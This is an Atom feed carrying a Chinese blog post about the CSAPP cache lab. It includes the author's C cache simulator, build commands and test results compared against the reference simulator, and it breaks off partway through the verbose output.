<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ardxwe</title>
  
  <subtitle>CSer</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-10-10T07:40:19.789Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Duan Jiahua</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS15-213labs-cache-lab</title>
    <link href="http://yoursite.com/2020/10/10/CS15-213labs-cache-lab/"/>
    <id>http://yoursite.com/2020/10/10/CS15-213labs-cache-lab/</id>
    <published>2020-10-10T06:19:28.000Z</published>
    <updated>2020-10-10T07:40:19.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>这门课程围绕 <a href="https://book.douban.com/subject/26912767/">CSAPP</a> 展开。</p><p>书本相关的所有信息，你可以在 <a href="http://csapp.cs.cmu.edu/">这里</a> 找到。</p><p>你可以在 <a href="https://www.bilibili.com/video/BV1iW411d7hd?p=1">Bilibili</a> 或者 <a href="https://www.youtube.com/watch?v=4CpHpFu_KYM&list=PLQ5cMeVTtiJkUilq92Cw9D6RhAJhPJ_JX">YouTube</a> 查看所有的课程视频，Bilibili附带中文字幕。 </p><p>建议看完相应的章节然后去做相应的实验。大名鼎鼎的 CSAPP 的作者即是这门课程的讲师。你可以在 <a href="http://csapp.cs.cmu.edu/3e/labs.html">这里</a> 找到实验相关的所有内容。</p><p>这门课程的实验代码可以在我的 <a href="https://github.com/ArdxWe/CS15-213labs">Github</a> 找到我的所有解答及相关资料。本次实验相关代码在 ./cachelab-handout 文件夹下。</p><h2 id="cache-lab"><a href="#cache-lab" class="headerlink" title="cache lab"></a>cache lab</h2><h3 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h3><p>点击 <a href="http://csapp.cs.cmu.edu/3e/labs.html">这里</a>， 然后点击圆圈处 <img src="/images/cache-lab-1.png" alt="Self-Study Handout"> 即可下载此次实验对应的文档。</p><p>解压之后文件夹对应目录:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  下载 tree cachelab-handout</span><br><span class="line">cachelab-handout</span><br><span class="line">├── cachelab.c</span><br><span class="line">├── cachelab.h</span><br><span class="line">├── csim.c</span><br><span class="line">├── csim-ref</span><br><span class="line">├── driver.py</span><br><span class="line">├── Makefile</span><br><span class="line">├── README</span><br><span class="line">├── <span class="built_in">test</span>-csim</span><br><span class="line">├── <span class="built_in">test</span>-trans.c</span><br><span class="line">├── tracegen.c</span><br><span class="line">├── traces</span><br><span class="line">│   ├── dave.trace</span><br><span class="line">│   ├── long.trace</span><br><span class="line">│   ├── trans.trace</span><br><span class="line">│   ├── yi2.trace</span><br><span class="line">│   └── yi.trace</span><br><span class="line">└── trans.c</span><br><span class="line"></span><br><span class="line">1 directory, 16 files</span><br></pre></td></tr></table></figure><ul><li>cachelab.c: 一些需要的辅助函数</li><li>cachelab.h: cachelab.c 对应头文件</li><li>csim.c: 需要编写的 A 部分: cache 模拟器</li><li>csim-ref: 可执行文件, 可以用来做参考的 cache 模拟器, 可以验证我们编写的模拟器的正确性</li><li>driver.py: 运行 test-csim 和 test-trans</li><li>Makefile: 编译代码</li><li>README: CMU 给出的相关说明， 我编写的文件介绍基本是翻译此文件中的内容 -&gt; <a href="https://github.com/ArdxWe/CS15-213labs/blob/master/cachelab-handout/README">说明文件</a></li><li>test-csim: 可执行文件， 测试我们编写的 cache 模拟器</li><li>test-trans.c: 测试我们实验B的正确性</li><li>tracegen.c: test-trans.c 的一些辅助函数</li><li>traces/ : 文件夹, 被 test-csim.c 使用的踪迹文件</li><li>trans.c: 需要编写的 B 部分: 转置函数</li></ul><h3 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h3><p>A： 编写简单的缓存模拟器<br>B： 优化矩阵转置以最大限度减少缓存未命中次数</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>LINUX</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>实验官方说明文件 <a href="https://github.com/ArdxWe/CS15-213labs/blob/master/cachelab-handout/cachelab.pdf">cachelab</a></p><h4 id="PART-A"><a href="#PART-A" class="headerlink" title="PART A"></a>PART A</h4><p>这是我编写的 csim.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define NDEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> print(x) <span class="meta-keyword">if</span> (infoflag) printf(x)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;assert.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getaddrfromline</span><span class="params">(<span class="keyword">char</span>* buff, <span class="keyword">char</span>* result)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getlownnumber</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 记录次数</span></span><br><span class="line">    <span class="keyword">long</span> hit_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> eviction_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> miss_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 缓存相关数据</span></span><br><span class="line">    <span class="keyword">long</span> tagbits = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> setsbits = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> linesperset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> blockbits = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件名</span></span><br><span class="line">    <span class="keyword">char</span>* filename = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否输出具体信息</span></span><br><span class="line">    <span class="keyword">bool</span> infoflag = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件</span></span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现 LRU 变量</span></span><br><span class="line">    <span class="keyword">long</span> max = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析命令行参数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i=<span class="number">1</span>; i&lt;argc; i++)&#123;</span><br><span class="line">        <span class="keyword">size_t</span> length = <span class="built_in">strlen</span>(argv[i]);</span><br><span class="line">        assert(length == <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">switch</span> (argv[i][<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            infoflag = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            setsbits = atoi(argv[++i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            linesperset = atoi(argv[++i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            blockbits = atoi(argv[++i]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            filename = argv[++i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Parameter error, you should use -v -s number -E number -b number -t filename&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 地址剩余位数应该为 tag 的位数</span></span><br><span class="line">    tagbits = <span class="keyword">sizeof</span>(<span class="keyword">void</span>*) * <span class="number">8</span> - setsbits - blockbits;</span><br><span class="line"></span><br><span class="line">    assert(tagbits &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cache块数</span></span><br><span class="line">    <span class="keyword">long</span> count = (<span class="number">1</span> &lt;&lt; setsbits) * linesperset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tag 和 used 用来模拟 cache</span></span><br><span class="line">    <span class="comment">// calloc: malloc and memset 0</span></span><br><span class="line">    <span class="keyword">long</span>* tagptr = <span class="built_in">calloc</span>(count, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">    <span class="keyword">long</span>* usedptr = <span class="built_in">calloc</span>(count, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (usedptr == <span class="literal">NULL</span> || tagptr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;calloc error.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fp = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">char</span> number[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">long</span> addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="built_in">set</span>;</span><br><span class="line">    <span class="keyword">long</span> tag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(buff, <span class="number">1024</span>, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(number, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 忽略 I 开头的行</span></span><br><span class="line">        <span class="keyword">if</span>(*(buff) == <span class="string">&#x27;I&#x27;</span>)<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去掉行尾回车</span></span><br><span class="line">        <span class="keyword">if</span>(buff[<span class="built_in">strlen</span>(buff)<span class="number">-1</span>] == <span class="string">&#x27;\n&#x27;</span>)buff[<span class="built_in">strlen</span>(buff)<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去掉行头空格</span></span><br><span class="line">        <span class="keyword">if</span>(infoflag &amp;&amp; buff[<span class="number">0</span>] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, buff + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (infoflag) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, buff);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 得到地址 存于 number</span></span><br><span class="line">        getaddrfromline(buff, number);</span><br><span class="line">        <span class="built_in">sscanf</span>(number, <span class="string">&quot;%lx&quot;</span>, &amp;addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 得到地址对应的 tag set</span></span><br><span class="line">        tag = getlownnumber(addr &gt;&gt; (blockbits + setsbits), tagbits);</span><br><span class="line">        <span class="built_in">set</span> = getlownnumber(addr &gt;&gt; blockbits, setsbits);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// cache 行</span></span><br><span class="line">        <span class="keyword">long</span>* nowptr = usedptr + <span class="built_in">set</span> * linesperset;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span>* <span class="keyword">this</span> = nowptr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">bool</span> allone = <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 试图找到 tag</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; linesperset; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (*<span class="keyword">this</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*(tagptr + <span class="built_in">set</span> * linesperset + i) == tag) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (*(buff+<span class="number">1</span>) == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">                        print(<span class="string">&quot;hit hit \n&quot;</span>);</span><br><span class="line">                        hit_count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        print(<span class="string">&quot;hit \n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    (*<span class="keyword">this</span>) = max++;</span><br><span class="line">                    hit_count++;</span><br><span class="line">                    <span class="keyword">goto</span> ff;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> allone = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">this</span>++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有空余块</span></span><br><span class="line">        <span class="keyword">if</span> (allone == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span> = nowptr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; linesperset; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*<span class="keyword">this</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    *(tagptr + <span class="built_in">set</span> * linesperset+i) = tag;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">this</span>++;</span><br><span class="line">            &#125;</span><br><span class="line">            *<span class="keyword">this</span> = max++;</span><br><span class="line">            <span class="keyword">if</span> (*(buff+<span class="number">1</span>) == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">                print(<span class="string">&quot;miss hit \n&quot;</span>);</span><br><span class="line">                hit_count++;</span><br><span class="line">                *<span class="keyword">this</span> = max++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                print(<span class="string">&quot;miss \n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            miss_count++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 驱逐</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">long</span> min = <span class="number">0x7FFFFFFFFFFFFFFF</span>;</span><br><span class="line">            <span class="keyword">this</span> = nowptr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; linesperset; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*<span class="keyword">this</span> != <span class="number">0</span> &amp;&amp; ((*<span class="keyword">this</span>) &lt; min)) &#123;</span><br><span class="line">                    min = *<span class="keyword">this</span>;</span><br><span class="line">                    index = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">this</span>++;</span><br><span class="line">            &#125;</span><br><span class="line">            *(tagptr + <span class="built_in">set</span> *linesperset + index) = tag;</span><br><span class="line">            *(nowptr + index) = max++;</span><br><span class="line">            <span class="keyword">if</span> (*(buff+<span class="number">1</span>) == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">                print(<span class="string">&quot;miss eviction hit \n&quot;</span>);</span><br><span class="line">                hit_count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                print(<span class="string">&quot;miss eviction \n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            miss_count++;</span><br><span class="line">            eviction_count++;</span><br><span class="line">        &#125;</span><br><span class="line">        ff:;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hits:%ld &quot;</span>, hit_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;misses:%ld &quot;</span>, miss_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;evictions:%ld\n&quot;</span>, eviction_count);</span><br><span class="line">    <span class="comment">// printSummary(hit_count, miss_count, eviction_count);</span></span><br><span class="line">    <span class="built_in">free</span>(tagptr);</span><br><span class="line">    <span class="built_in">free</span>(usedptr);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getaddrfromline</span><span class="params">(<span class="keyword">char</span>* buff, <span class="keyword">char</span>* result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> start = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i=<span class="number">0</span>; ; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((buff[i] == <span class="string">&#x27; &#x27;</span>) &amp;&amp; (i != <span class="number">0</span>) &amp;&amp;(buff[i+<span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>)) &#123;</span><br><span class="line">            start = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (buff[i] == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            end = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strncpy</span>(result, buff + start, end - start);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getlownnumber</span><span class="params">(<span class="keyword">long</span> addr, <span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">long</span> i=<span class="number">1</span>; i&lt;n; i++) x = x | (x &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> x &amp; addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码非常清晰： 首先解析命令行参数， 获取缓存参数以及是否打印详细信息的标志， 然后 malloc 对应大小的 tag 和 used(因为需要使用最近最久未使用算法驱逐对应的块)， 之后读取参数的 trace 文件， 打印每一次缓存命中情况。这里获取命令行参数没有使用 说明文件 推荐的 getopt 函数， 因为我觉得直接通过 argc 和 argv 挺方便。</p><p>结果:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  cachelab-handout git:(master) make      </span><br><span class="line">gcc -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm </span><br><span class="line">gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c</span><br><span class="line">gcc -g -Wall -Werror -std=c99 -m64 -o <span class="built_in">test</span>-trans <span class="built_in">test</span>-trans.c cachelab.c trans.o </span><br><span class="line">gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c</span><br><span class="line"><span class="comment"># Generate a handin tar file each time you compile</span></span><br><span class="line">tar -cvf ardxwe-handin.tar  csim.c trans.c </span><br><span class="line">csim.c</span><br><span class="line">trans.c</span><br><span class="line">➜  cachelab-handout git:(master) ✗ ./<span class="built_in">test</span>-csim </span><br><span class="line">                        Your simulator     Reference simulator</span><br><span class="line">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span><br><span class="line">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span><br><span class="line">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span><br><span class="line">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span><br><span class="line">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span><br><span class="line">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span><br><span class="line">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span><br><span class="line">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span><br><span class="line">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span><br><span class="line">    27</span><br><span class="line"></span><br><span class="line">TEST_CSIM_RESULTS=27</span><br></pre></td></tr></table></figure><p>都正确。 加入 -v 查看输出是否一致:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  cachelab-handout git:(master) ✗ gcc -o csim csim.c                                     </span><br><span class="line">➜  cachelab-handout git:(master) ✗ ./csim -v -s 4 -E 1 -b 4 -t traces/yi.trace &gt; 1.txt    </span><br><span class="line">➜  cachelab-handout git:(master) ✗ ./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace &gt; 2.txt</span><br><span class="line">➜  cachelab-handout git:(master) ✗ diff 1.txt 2.txt                                       </span><br><span class="line">➜  cachelab-handout git:(master) ✗ cat 1.txt                                              </span><br><span class="line">L 10,1 miss </span><br><span class="line">M 20,1 miss hit </span><br><span class="line">L 22,1 hit </span><br><span class="line">S 18,1 hit </span><br><span class="line">L 110,1 miss eviction </span><br><span class="line">L 210,1 miss eviction </span><br><span class="line">M 12,1 miss eviction hit </span><br><span class="line">hits:4 misses:5 